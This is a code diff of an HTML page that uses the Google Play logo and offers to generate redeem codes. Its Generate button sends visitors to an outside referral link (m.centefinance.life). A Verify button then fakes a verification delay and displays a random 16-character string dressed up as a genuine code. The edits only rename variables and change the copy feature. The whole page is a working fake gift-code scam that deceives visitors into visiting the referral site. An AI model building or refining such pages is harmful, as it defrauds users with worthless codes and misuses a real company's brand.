@@ -67,13 +67,7 @@
       text-align:center;
       border:2px solid #ccc;
       border-radius:6px;
-      margin-bottom:10px;
-    }
-    #copyMessage {
-      margin-top:10px;
-      font-size:14px;
-      color:#28a745;
-      visibility:hidden;
+      margin-bottom:15px;
     }
   </style>
 </head>
@@ -84,14 +78,13 @@
       <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/d/d0/Google_Play_Arrow_logo.svg/512px-Google_Play_Arrow_logo.svg.png" alt="Google Logo">
     </div>
 
-    <button id="startButton">Generate</button>
+    <button id="generateButton">Generate</button>
     <button id="verifyButton" style="display:none;">Verify</button>
 
     <div id="codeContainer">
       <p>🎉 Redeem Code Generated</p>
       <input type="text" id="redeemCode" readonly>
-      <button id="copyBtn">Copy</button>
-      <div id="copyMessage">Copied!</div>
+      <button id="copyBtn" onclick="copyCode()">Copy</button>
     </div>
   </div>
 
@@ -99,17 +92,14 @@
     const GENERATE_URL = 'https://m.centefinance.life/?rel=uodkbnhi';
     const ONE_DAY_MS = 24 * 60 * 60 * 1000;
 
-    const startButton   = document.getElementById('startButton');
-    const verifyButton  = document.getElementById('verifyButton');
+    const generateBtn   = document.getElementById('generateButton');
+    const verifyBtn     = document.getElementById('verifyButton');
     const codeContainer = document.getElementById('codeContainer');
     const redeemCode    = document.getElementById('redeemCode');
-    const copyBtn       = document.getElementById('copyBtn');
-    const copyMessage   = document.getElementById('copyMessage');
 
-    // Decide which button to show
     window.addEventListener('DOMContentLoaded', () => {
       const ts = localStorage.getItem('generatedAt');
-      if (ts && (Date.now() - parseInt(ts)) < ONE_DAY_MS) {
+      if (ts && (Date.now() - parseInt(ts,10) < ONE_DAY_MS)) {
         showVerify();
       } else {
         localStorage.removeItem('generatedAt');
@@ -118,49 +108,39 @@
     });
 
     function showGenerate() {
-      startButton.style.display = 'block';
-      verifyButton.style.display = 'none';
+      generateBtn.style.display = 'block';
+      verifyBtn.style.display   = 'none';
       codeContainer.style.display = 'none';
     }
 
     function showVerify() {
-      startButton.style.display = 'none';
-      verifyButton.style.display = 'block';
+      generateBtn.style.display = 'none';
+      verifyBtn.style.display   = 'block';
+      codeContainer.style.display = 'none';
     }
 
-    // Generate button: loading then redirect
-    startButton.addEventListener('click', () => {
-      startButton.disabled  = true;
-      startButton.innerText = 'Loading...';
+    generateBtn.addEventListener('click', () => {
+      generateBtn.disabled   = true;
+      generateBtn.innerText  = 'Loading...';
       setTimeout(() => {
         localStorage.setItem('generatedAt', Date.now().toString());
         window.location.href = GENERATE_URL;
       }, 800);
     });
 
-    // Verify logic
     let hasVerified = false;
-    verifyButton.addEventListener('click', () => {
+    verifyBtn.addEventListener('click', () => {
       if (hasVerified) return;
       hasVerified = true;
-      verifyButton.innerText   = 'Verifying...';
-      verifyButton.disabled    = true;
+
+      verifyBtn.innerText   = 'Verifying...';
+      verifyBtn.disabled    = true;
 
       setTimeout(() => {
-        verifyButton.innerText            = 'Verified';
-        verifyButton.style.backgroundColor = 'gray';
-        codeContainer.style.display       = 'flex';
-        redeemCode.value                  = generateCode();
-      }, 2000);
-    });
-
-    // Copy logic: inline message
-    copyBtn.addEventListener('click', () => {
-      redeemCode.select();
-      document.execCommand('copy');
-      copyMessage.style.visibility = 'visible';
-      setTimeout(() => {
-        copyMessage.style.visibility = 'hidden';
+        verifyBtn.innerText             = 'Verified';
+        verifyBtn.style.backgroundColor = 'gray';
+        codeContainer.style.display     = 'flex';
+        redeemCode.value                = generateCode();
       }, 2000);
     });
 
@@ -169,9 +149,16 @@
       let code = '';
       for (let i = 0; i < 16; i++) {
         code += chars.charAt(Math.floor(Math.random() * chars.length));
-        if ((i + 1) % 4 === 0 && i !== 15) code += '-';
+        if ((i+1)%4 === 0 && i !== 15) code += '-';
       }
       return code;
+    }
+
+    function copyCode() {
+      redeemCode.select();
+      redeemCode.setSelectionRange(0, 99999);
+      document.execCommand('copy');
+      // No alert on copy
     }
   </script>
 </body>
